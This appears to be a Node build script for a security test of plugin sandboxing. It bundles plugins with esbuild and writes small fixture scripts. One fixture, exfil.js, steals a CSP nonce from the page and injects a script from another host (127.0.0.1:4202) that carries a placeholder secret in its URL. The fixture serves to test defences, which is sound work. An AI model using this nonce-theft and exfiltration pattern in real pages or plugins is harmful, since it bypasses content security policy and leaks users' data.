// Bundles the spike's plugin code with esbuild into build/, and writes the small hand-made scripts.
import * as esbuild from "esbuild";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const out = path.join(here, "build");

export async function build() {
  fs.mkdirSync(path.join(out, "esm"), { recursive: true });
  const common = { bundle: true, jsx: "automatic", logLevel: "warning", absWorkingDir: here };
  const prod = { ...common, minify: true, define: { "process.env.NODE_ENV": '"production"' } };
  const dev = { ...common, minify: false, define: { "process.env.NODE_ENV": '"development"' } };
  await esbuild.build({ ...prod, entryPoints: ["src/q6-plugin.jsx"], format: "iife", outfile: "build/q6-plugin.js" });
  await esbuild.build({ ...dev, entryPoints: ["src/q6-plugin.jsx"], format: "iife", outfile: "build/q6-plugin-dev.js" });
  await esbuild.build({ ...prod, entryPoints: ["src/q8-plugin.jsx"], format: "iife", outfile: "build/q8-plugin.js" });
  await esbuild.build({ ...prod, entryPoints: ["src/esm-a.jsx", "src/esm-b.jsx"], format: "esm", splitting: true, outdir: "build/esm", chunkNames: "chunk-[hash]" });

  const w = (f, s) => fs.writeFileSync(path.join(out, f), s);
  w("classic.js", "window.__r('loaded', 'classic external');\n");
  w("mod.js", "window.__r('loaded', 'module ' + (typeof import.meta.url));\n");
  w("dep.js", "export const x = 'dep';\n");
  w("mod-imports.js", "import { x } from './dep.js';\nwindow.__r('loaded', 'imported ' + x);\n");
  w("worker.js", "postMessage('from url worker');\n");
  // Plugin code that tries to leave: steal a nonce and load a script from another host (which would carry data out).
  w("exfil.js", `(function(){
  var n = "";
  document.querySelectorAll("script").forEach(function(s){ n = n || s.nonce || s.getAttribute("nonce") || ""; });
  window.__r("attempt", { nonceFound: !!n });
  var s = document.createElement("script");
  if (n) s.nonce = n;
  s.src = "http://127.0.0.1:4202/plugin/none/leak.js?d=" + encodeURIComponent("secret-from-plugin");
  document.head.appendChild(s);
})();\n`);
  w("leak.js", "window.__r('loaded', 'LEAK: script from 127.0.0.1:4202 ran');\n");
  w("inject.js", "window.__r('loaded', 'injected by trusted script');\n");
  fs.copyFileSync("/System/Library/Fonts/Supplemental/NotoSansLycian-Regular.ttf", path.join(out, "font.ttf"));
  const esm = fs.readdirSync(path.join(out, "esm"));
  return { esm, chunk: esm.find((f) => f.startsWith("chunk-")) };
}

if (import.meta.url === `file://${process.argv[1]}`) console.log(await build());
